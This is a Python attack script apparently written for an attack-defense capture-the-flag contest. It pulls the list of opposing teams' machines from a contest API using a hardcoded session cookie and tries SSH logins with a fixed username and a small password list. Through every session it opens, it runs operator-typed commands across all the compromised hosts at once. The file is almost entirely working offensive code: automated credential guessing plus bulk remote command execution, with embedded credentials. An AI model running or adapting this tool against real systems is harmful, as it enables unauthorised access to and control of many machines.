# coding=gbk
#!/usr/bin/env python3

import requests
import json
import time
import threading
import queue
import paramiko
import warnings
warnings.filterwarnings("ignore")


username = "ctf"
passwds = ["Aa0NTI5NzA=", "U98Suu8ue3"]
new_passwd = "U98Suu8ue3"


# cookie =后面的部分
session_cookie = "MTczMzQ2NzUzNHxOd3dBTkVsRVYxZFZTMXBXU1ZST05VWldNMVpaVVVSU1REVlVXRmRTUVU1TFZWUlpNa1pJVlVreVVVcEVNazVTV1VKSFZFUTNTMEU9fENpxgQZDyGd10ry6gl3ZjmVxRPZDBDfnE67ZcgOmTlz"

# 165 AWD1
CONTEST_ID = 725

api_url = "https://10.12.153.99/api"



keep_alive = True

def get_ssh_hosts(queue):
    while (keep_alive):
        # 获取所有队伍id及靶机情况
        response = requests.get(url=f"{api_url}/awd/rank?id={CONTEST_ID}", verify=False)
        for group in json.loads(response.text)["scores"]:
            try:
                group_id = group["groupID"]
                section_id = group["sectionStates"][0]["sectionID"]
                # 获取靶机信息
                response = requests.get(url=f"{api_url}/awd/machine?groupID={group_id}&sectionID={section_id}", verify=False, cookies={"SESSIONID":session_cookie})
                machine = json.loads(response.text)["machineInfo"][0]
                ip = machine["ip"]
                ports = machine["portInfos"]
                for port in ports:
                    if (port["targetPort"] == 22):
                        ssh_port = ports[0]["publishedPort"]
                        queue.put(f"{ip}:{ssh_port}")
            except:
                pass
        time.sleep(300)

def new_ssh(ip, port, passwd, queue):
    print(f"try to connect [{ip}:{port}]")
    ssh = paramiko.SSHClient()
    try:
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=ip, port=port, username=username, password=passwd, look_for_keys=False, allow_agent=False)
    except:
        return
    # 获取 SSH 传输对象
    transport = ssh.get_transport()

    # 检查连接状态
    if transport.is_active():
        print(f"[{ip}:{port}]: SSH connection successful")
        queue.put((f"{ip}:{port}", ssh))
    else:
        print(f"[{ip}:{port}]: SSH connection failed")


def connect_ssh(targets, hosts_q, ssh_q):
    while (keep_alive):
        ip_port = hosts_q.get()
        if (ip_port in targets):
            if (targets[ip_port].get_transport().is_active()):
                pass
        ip, port = ip_port.split(":")
        port = int(port)
        for passwd in passwds:
            thread = threading.Thread(target=new_ssh, args=(ip, port, passwd, ssh_q))
            thread.start()

targets = {}

hosts_q = queue.Queue()
ssh_q = queue.Queue()

get_hosts_thread = threading.Thread(target=get_ssh_hosts, args=(hosts_q,))
connect_ssh_thread = threading.Thread(target=connect_ssh, args=(targets, hosts_q, ssh_q))
get_hosts_thread.start()
connect_ssh_thread.start()

# 批量命令
while True:
    cmd = input("cmd=>")
    while (not ssh_q.empty()):
        ssh = ssh_q.get()
        if (ssh[0] in targets):
            try:
                targets[ssh[0]].close()
            except:
                pass
        targets[ssh[0]] = ssh[1]
    msg = ""
    for ip in targets:
        ssh = targets[ip]
        if (not ssh.get_transport().is_active()):
            targets.pop(ip)
            continue
        try:
            stdin, stdout, stderr = ssh.exec_command(cmd)
            output = stdout.read().decode('utf-8')
            s = f"[{ip}]: {output}"
            msg += s + "\n"
            print(s)
        except:
            s = f"[{ip}]: Failed!!!"
            msg += s + "\n"
    with open(f"outputs/output-{time.time()}.txt", "wt") as f:
        f.write(msg)
keep_alive = False
